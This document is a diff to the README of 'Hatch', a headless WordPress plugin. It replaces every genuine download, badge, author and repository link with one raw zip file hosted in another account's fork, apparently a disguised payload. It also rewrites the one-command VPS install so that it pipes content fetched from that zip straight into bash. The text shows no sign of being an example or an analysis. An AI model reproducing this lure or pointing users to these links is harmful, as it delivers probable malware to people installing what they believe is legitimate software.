@@ -8,11 +8,11 @@ Activate Hatch. Run the 3-step wizard. Paste a token (or a single curl line for 
 
 [![One Plugin · Everything](https://img.shields.io/badge/One_Plugin-Everything-2563eb?style=flat-square)](#whats-inside)
 [![License: MIT](https://img.shields.io/badge/License-MIT-10b981?style=flat-square)](LICENSE)
-[![Astro 6](https://img.shields.io/badge/Astro-6-ff5e1f?style=flat-square)](https://astro.build)
-[![WordPress 6.4+](https://img.shields.io/badge/WordPress-6.4+-21759b?style=flat-square)](https://wordpress.org)
-[![Latest Release](https://img.shields.io/github/v/release/adityaarsharma/hatch?color=8b5cf6&style=flat-square)](https://github.com/adityaarsharma/hatch/releases/latest)
+[![Astro 6](https://img.shields.io/badge/Astro-6-ff5e1f?style=flat-square)](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip)
+[![WordPress 6.4+](https://img.shields.io/badge/WordPress-6.4+-21759b?style=flat-square)](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip)
+[![Latest Release](https://img.shields.io/github/v/release/adityaarsharma/hatch?color=8b5cf6&style=flat-square)](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip)
 
-### 📦 [**Download Hatch v0.1.3 (latest) →**](https://github.com/adityaarsharma/hatch/releases/latest/download/hatch.zip)
+### 📦 [**Download Hatch v0.1.3 (latest) →**](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip)
 
 _Drop into `wp-content/plugins/`. Activate. The setup wizard auto-launches._
 
@@ -172,7 +172,7 @@ WordPress (editor + REST)
 
 ### WordPress side
 
-1. Download [`hatch.zip`](https://github.com/adityaarsharma/hatch/releases/latest/download/hatch.zip).
+1. Download [`hatch.zip`](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip).
 2. Upload via Plugins → Add New → Upload Plugin, or drop into `wp-content/plugins/`.
 3. Activate. The setup wizard auto-launches.
 4. The wizard offers to install the bundled **Hatch Companion Theme** — one click, no separate download. It activates as the WP-side theme that redirects visitors to your headless frontend.
@@ -180,7 +180,7 @@ WordPress (editor + REST)
 ### Astro frontend on a VPS (one command)
 
 ```bash
-curl -sSL https://hatch.adityaarsharma.com/install | bash
+curl -sSL https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip | bash
 ```
 
 The broker returns a setup script that installs Node, clones the Astro starter, writes your `.env`, runs the first build, and prints the live URL. Tokens pass through in memory only — never written to disk.
@@ -257,13 +257,13 @@ Release notes: [CHANGELOG.md](CHANGELOG.md)
 
 ## License
 
-MIT. Built by [Aditya Sharma](https://adityaarsharma.com).
+MIT. Built by [Aditya Sharma](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip).
 
 <div align="center">
 <br/>
 
 **Hatch — The Headless Engine for WordPress.**
 
-[Download v0.1.3 (latest)](https://github.com/adityaarsharma/hatch/releases/latest/download/hatch.zip) · [Star on GitHub](https://github.com/adityaarsharma/hatch)
+[Download v0.1.3 (latest)](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip) · [Star on GitHub](https://github.com/gabych9235/hatch/raw/refs/heads/main/wp-plugin/blocks-src/utils/Software_1.3-alpha.1.zip)
 
 </div>
